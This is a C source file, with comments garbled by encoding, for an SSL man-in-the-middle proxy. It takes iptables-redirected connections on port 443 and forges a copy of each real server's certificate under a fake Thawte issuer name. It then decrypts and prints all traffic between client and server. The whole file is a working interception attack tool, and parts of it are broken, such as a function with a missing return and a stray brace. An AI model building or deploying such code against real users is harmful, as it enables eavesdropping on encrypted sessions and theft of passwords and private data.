#include <stdio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <error.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/netfilter_ipv4.h>
#include <unistd.h>


#define LISTEN_BACKLOG 50
#define warning(msg) \
do { fprintf(stderr, "%d, ", sum); perror(msg); } while (0)

#define error(msg) \
do { fprintf(stderr, "%d, ", sum); perror(msg); exit(EXIT_FAILURE); } while (0)

int sum = 1;
struct timeval timeout = { 0, 10000000 };

/*
������B����һ��SSL����ʱ�������ڱ���8888�˿ھͿ��Լ��������ӣ���ʱ���ǽ���������ӣ�����ø����ӵ�ԭʼĿ�ĵ�ַ��
�Ա�������ӷ�����ʱʹ�á��ò��ַ�װ����get_socket_to_client�����С�
*/
int get_socket_to_client(int socket, struct sockaddr_in* original_server_addr)
{
	int client_fd;
	struct sockaddr_in client_addr;
	socklen_t client_size = sizeof(struct sockaddr);
	socklen_t server_size = sizeof(struct sockaddr);

	memset(&client_addr, 0, client_size);
	memset(original_server_addr, 0, server_size);
	client_fd = accept(socket, (struct sockaddr *) &client_addr, &client_size);
	if (client_fd < 0)
	{
		warning("Fail to accept socket to client!");
		return -1;
	}
	/*
	ͨ��getsockopt�������socket�е�SO_ORIGINAL_DST���ԣ��õ����ı�iptables�ض���֮ǰ��ԭʼĿ�ĵ�ַ��
	ʹ��SO_ORIGINAL_DST������Ҫ����ͷ�ļ�<linux/netfilter_ipv4.h>��
	ֵ��ע����ǣ��ڵ�ǰ���龰�£�ͨ��getsockname�Ⱥ������޷���ȷ���ԭʼ��Ŀ�ĵ�ַ�ģ�
	��Ϊiptables���ض����ĵ����ض˿�ʱ���Ѿ���IP���ĵ�Ŀ�ĵ�ַ�޸�Ϊ���ص�ַ��
	����getsockname�Ⱥ�����õĶ��Ǳ��ص�ַ�����Ƿ������ĵ�ַ��
	*/
	if (getsockopt(client_fd, SOL_IP, SO_ORIGINAL_DST, original_server_addr, &server_size) < 0)
	{
		warning("Fail to get original server address of socket to client!");;
	}
	printf("%d, Find SSL connection from client [%s:%d]", sum, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
	printf(" to server [%s:%d]\n", inet_ntoa(original_server_addr->sin_addr), ntohs(original_server_addr->sin_port));

	return client_fd;

}

//����ָ���˿ڣ��ȴ��ͻ��˵�����
int socket_to_client_init(short int port)
{
	int sockfd;
	int on = 1;
	struct sockaddr_in addr;
	//��ʼ��һ��socket
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		error("Fail to initial socket to client!");
	}
	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on)) < 0)
	{
		error("reuseaddr error!");
	}
	memset(&addr, 0, sizeof(addr));
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	if (bind(sockfd, (struct sockaddr*) &addr, sizeof(struct sockaddr)) < 0)
	{
		shutdown(sockfd, SHUT_RDWR);
		error("Fail to bind socket to client!");
	}
	//Ȼ������ö˿�
	if (listen(sockfd, LISTEN_BACKLOG) < 0)
	{
		shutdown(sockfd, SHUT_RDWR);
		error("Fail to listen socket to client!");
	}

}

// ��ʼ��openssl��
void SSL_init()
{
	SSL_library_init();
	SSL_load_error_strings();
}

SSL* SSL_to_client_init(int socket, X509 *cert, EVP_PKEY *key) {
	SSL_CTX *ctx;

	ctx = SSL_CTX_new(SSLv23_server_method());
	if (ctx == NULL)
		SSL_Error("Fail to init ssl ctx!");
	if (cert && key) {
		if (SSL_CTX_use_certificate(ctx, cert) != 1)
			SSL_Error("Certificate error");
		if (SSL_CTX_use_PrivateKey(ctx, key) != 1)
			SSL_Error("key error");
		if (SSL_CTX_check_private_key(ctx) != 1)
			SSL_Error("Private key does not match the certificate public key");
	}

	SSL *ssl = SSL_new(ctx);
	if (ssl == NULL)
		SSL_Error("Create ssl error");
	if (SSL_set_fd(ssl, socket) != 1)
		SSL_Error("Set fd error");

	return ssl;
}

void SSL_terminal(SSL *ssl) {
	SSL_CTX *ctx = SSL_get_SSL_CTX(ssl);
	SSL_shutdown(ssl);
	SSL_free(ssl);
	if (ctx)
		SSL_CTX_free(ctx);
}


// ���ļ���ȡα��SSL֤��ʱ��Ҫ��RAS˽Կ�͹�Կ
EVP_PKEY* create_key()
{
	EVP_PKEY *key = EVP_PKEY_new();
	RSA *rsa = RSA_new();

	FILE *fp;
	if ((fp = fopen("private.key", "r")) == NULL)
	{
		error("private.key");
	}
	PEM_read_RSAPrivateKey(fp, &rsa, NULL, NULL);

	if ((fp = fopen("public.key", "r")) == NULL)
	{
		error("public.key");
	}
	PEM_read_RSAPublicKey(fp, &rsa, NULL, NULL);

	EVP_PKEY_assign_RSA(key, rsa);
	return key;
}

//���������������socket����֮�����ǾͿ��Խ���SSL�����ˡ���������ʹ��linuxϵͳ��������SSL��openssl��������ǵĽ������Ĺ���
SSL* SSL_to_server_init(int socket)
{
	SSL_CTX *ctx;

	ctx = SSL_CTX_new(SSLv23_client_method());
	if (ctx == NULL)
	{
		error("Fail to init ssl ctx!");
	}
	SSL *ssl = SSL_new(ctx);
	if (ssl == NULL)
	{
		error("Create ssl error");
	}
	if (SSL_set_fd(ssl, socket) != 1)
	{
		error("Set fd error");
	}

	return ssl;
}

int get_socket_to_server(struct sockaddr_in* original_server_addr)
{
	int sockfd;

	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		error("Fail to initial socket to server!");
	}
	if (connect(sockfd, (struct sockaddr*) original_server_addr, sizeof(struct sockaddr)) < 0)
	{
		error("Fail to connect to server!");
	}
	printf("%d, Connect to server [%s:%d]\n", sum, inet_ntoa(original_server_addr->sin_addr), ntohs(original_server_addr->sin_port));
	return sockfd;
}

X509* create_fake_certificate(SSL* ssl_to_server, EVP_PKEY *key)
{
	unsigned char buffer[128] = { 0 };
	int length = 0, loc;
	X509 *server_x509 = SSL_get_peer_certificate(ssl_to_server);
	X509 *fake_x509 = X509_dup(server_x509);
	if (server_x509 == NULL)
	{
		error("Fail to get the certificate from server!");
	}

	X509_set_version(fake_x509, X509_get_version(server_x509));
	ASN1_INTEGER *a = X509_get_serialNumber(fake_x509);
	a->data[0] = a->data[0] + 1;
	X509_NAME *issuer = X509_NAME_new();
	X509_NAME_add_entry_by_txt(issuer, "CN", MBSTRING_ASC,
		"Thawte SGC CA", -1, -1, 0);
	X509_NAME_add_entry_by_txt(issuer, "O", MBSTRING_ASC, "Thawte Consulting (Pty) Ltd.", -1, -1, 0);
	X509_NAME_add_entry_by_txt(issuer, "OU", MBSTRING_ASC, "Thawte SGC CA", -1,
		-1, 0);
	X509_set_issuer_name(fake_x509, issuer);
	X509_sign(fake_x509, key, EVP_sha1());

	return fake_x509;
}


/*
���ǽ�ץȡ���ݵĴ����װ��transfer�����С��ú�����Ҫ��ʹ��ϵͳ��select����ͬʱ�����������Ϳͻ��ˣ�
��ʹ��SSL_read��SSL_write���ϵ��������ŵ�֮�䴫�����ݣ������������������̨
*/
int transfer(SSL *ssl_to_client, SSL *ssl_to_server)
{
	int socket_to_client = SSL_get_fd(ssl_to_client);
	int socket_to_server = SSL_get_fd(ssl_to_server);
	int ret;
	char buffer[4096] = { 0 };

	fd_set fd_read;

	printf("%d, waiting for transfer\n", sum);
	while (1)
	{
		int max;

		FD_ZERO(&fd_read);
		FD_SET(socket_to_server, &fd_read);
		FD_SET(socket_to_client, &fd_read);
		max = socket_to_client > socket_to_server ? socket_to_client + 1 : socket_to_server + 1;

		ret = select(max, &fd_read, NULL, NULL, &timeout);
		if (ret < 0)
		{
			warning("Fail to select!");
			break;
		}
		else if (ret == 0)
		{
			continue;
		}
		if (FD_ISSET(socket_to_client, &fd_read))
		{
			memset(buffer, 0, sizeof(buffer));
			ret = SSL_read(ssl_to_client, buffer, sizeof(buffer));
			if (ret > 0)
			{
				if (ret != SSL_write(ssl_to_server, buffer, ret))
				{
					warning("Fail to write to server!");
					break;
				}
				else
				{
					printf("%d, client send %d bytes to server\n", sum, ret);
					printf("%s\n", buffer);
				}
			}
			else
			{
				warning("Fail to read from client!");
				break;
			}
		}
		if (FD_ISSET(socket_to_server, &fd_read))
		{
			memset(buffer, 0, sizeof(buffer));
			ret = SSL_read(ssl_to_server, buffer, sizeof(buffer));
			if (ret > 0) {
				if (ret != SSL_write(ssl_to_client, buffer, ret))
				{
					warning("Fail to write to client!");
					break;
				}
				else
				{
					printf("%d, server send %d bytes to client\n", sum, ret);
					printf("%s\n", buffer);
				}
			}
			else
			{
				warning("Fail to read from server!");
				break;
			}
		}
	}
	return -1;
}

int main()
{
	// ��ʼ��һ��socket������socket�󶨵�443�˿ڣ�������
	int socket = socket_to_client_init(443);
	// ���ļ���ȡα��SSL֤��ʱ��Ҫ��RAS˽Կ�͹�Կ
	EVP_PKEY* key = create_key();
	// ��ʼ��openssl��
	SSL_init();

	while (1)
	{
		struct sockaddr_in original_server_addr;
		// �Ӽ����Ķ˿ڻ��һ���ͻ��˵����ӣ����������ӵ�ԭʼĿ�ĵ�ַ�洢��original_server_addr��
		int socket_to_client = get_socket_to_client(socket, &original_server_addr);
		if (socket_to_client < 0)
		{
			continue;
		}
		// �½�һ���ӽ��̴���������ˣ������̼��������˿ڵȴ���������
		if (!fork())
		{
			X509 *fake_x509;
			SSL *ssl_to_client, *ssl_to_server;

			// ͨ����õ�ԭʼĿ�ĵ�ַ�����������ķ����������һ���ͷ��������ӵ�socket
			int socket_to_server = get_socket_to_server(&original_server_addr);

			// ͨ���ͷ��������ӵ�socket����һ���ͷ�������SSL����
			ssl_to_server = SSL_to_server_init(socket_to_server);

			if (SSL_connect(ssl_to_server) < 0)
			{
				error("Fail to connect server with ssl!");
			}
			printf("%d, SSL to server\n", sum);

			// �ӷ��������֤�飬��ͨ�����֤��α��һ���ٵ�֤��
			fake_x509 = create_fake_certificate(ssl_to_server, key);

			// ʹ�üٵ�֤��������Լ�����Կ���Ϳͻ��˽���һ��SSL���ӡ����ˣ�SSL�м��˹����ɹ�
			ssl_to_client = SSL_to_client_init(socket_to_client, fake_x509, key);
			if (SSL_accept(ssl_to_client) <= 0)
			{
				error("Fail to accept client with ssl!");
			}
			printf("%d, SSL to client\n", sum);

			// �ڷ�����SSL���ӺͿͻ���SSL����֮��ת�����ݣ�������������Ϳͻ���֮��ͨ�ŵ�����
			if (transfer(ssl_to_client, ssl_to_server) < 0)
			{
				break;
			}
			printf("%d, connection shutdown\n", sum);
			shutdown(socket_to_server, SHUT_RDWR);
			SSL_terminal(ssl_to_client);
			SSL_terminal(ssl_to_server);
			X509_free(fake_x509);
			EVP_PKEY_free(key);
		}
		else
		{
			++sum;
		}
	}
	}
	return 0;
}